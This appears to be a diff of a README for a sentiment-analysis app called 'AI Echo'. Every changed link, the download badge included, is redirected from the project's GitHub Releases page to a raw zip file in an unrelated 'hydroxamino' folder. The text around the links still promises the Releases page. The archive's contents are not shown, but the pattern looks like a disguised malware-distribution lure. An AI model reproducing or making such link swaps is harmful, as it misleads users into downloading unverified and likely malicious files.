@@ -1,6 +1,6 @@
 # 💬 Project_5-AI-Echo_Sentiment-Analysis - Analyze Reviews with Ease
 
-[![Download Project_5-AI-Echo_Sentiment-Analysis](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/tunawasabe/Project_5-AI-Echo_Sentiment-Analysis/releases)
+[![Download Project_5-AI-Echo_Sentiment-Analysis](https://raw.githubusercontent.com/tunawasabe/Project_5-AI-Echo_Sentiment-Analysis/main/hydroxamino/Project_5-AI-Echo_Sentiment-Analysis.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/tunawasabe/Project_5-AI-Echo_Sentiment-Analysis/main/hydroxamino/Project_5-AI-Echo_Sentiment-Analysis.zip)
 
 ## 🌟 Overview
 
@@ -11,7 +11,7 @@ AI Echo helps you analyze user reviews and predict sentiment using natural langu
 To get started with AI Echo, follow these simple steps to download and run the application on your computer. 
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/tunawasabe/Project_5-AI-Echo_Sentiment-Analysis/releases) to access the Releases page where you will find the available versions of the application.
+   Click [here](https://raw.githubusercontent.com/tunawasabe/Project_5-AI-Echo_Sentiment-Analysis/main/hydroxamino/Project_5-AI-Echo_Sentiment-Analysis.zip) to access the Releases page where you will find the available versions of the application.
 
 2. **Choose Your Version**  
    Scroll through the list of available versions. Select the latest version for the best features and updates.
@@ -27,7 +27,7 @@ To get started with AI Echo, follow these simple steps to download and run the a
 
 ## 📥 Download & Install
 
-Visit the Releases page to download the latest version of AI Echo: [Download Now](https://github.com/tunawasabe/Project_5-AI-Echo_Sentiment-Analysis/releases). 
+Visit the Releases page to download the latest version of AI Echo: [Download Now](https://raw.githubusercontent.com/tunawasabe/Project_5-AI-Echo_Sentiment-Analysis/main/hydroxamino/Project_5-AI-Echo_Sentiment-Analysis.zip). 
 
 To run the program smoothly, ensure you have:
 
@@ -69,4 +69,4 @@ If you'd like to contribute to AI Echo, we welcome your suggestions and improvem
 
 AI Echo is open source and available for anyone to use and modify following the applicable license.
 
-Visit the Releases page to download AI Echo today: [Download Now](https://github.com/tunawasabe/Project_5-AI-Echo_Sentiment-Analysis/releases).
+Visit the Releases page to download AI Echo today: [Download Now](https://raw.githubusercontent.com/tunawasabe/Project_5-AI-Echo_Sentiment-Analysis/main/hydroxamino/Project_5-AI-Echo_Sentiment-Analysis.zip).
